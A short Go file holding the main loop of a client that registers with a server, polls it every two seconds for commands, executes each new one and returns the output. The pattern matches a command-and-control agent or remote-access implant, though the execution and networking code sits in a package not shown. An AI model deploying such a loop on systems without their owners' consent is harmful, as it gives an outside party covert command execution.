package main

import (
	"client/core"
	"fmt"
	"time"
)

func main() {

	// create client
	client := core.Client{}

	if !client.InitClient() {
		return
	}

	_, err := client.IdentifyToServer()

	if err != nil {
		fmt.Println("Failed To Identify Client To Server, Error: ", err)
		return
	}

	for {
		time.Sleep(time.Second * 2)
		cmd, err := client.FetchCommand()

		if err != nil {
			continue
		}

		lastExec := client.GetLastExecutedCmd()

		if lastExec != core.EmptyCommand {
			// if the server doesnt have a new command, continue
			if lastExec.Id == cmd.Id {
				continue
			}

		}

		// no issued command, continue
		if cmd == core.EmptyCommand {
			continue
		}

		fmt.Println("Fetched Command At Time:", cmd.ReceivedAt)

		excCmd := client.ExecuteCmd(*cmd)

		sErr := client.SendCmdOutput(excCmd, cmd.Id)

		if sErr != nil {
			continue
		}

		fmt.Println("Sent Output!")

	}
}
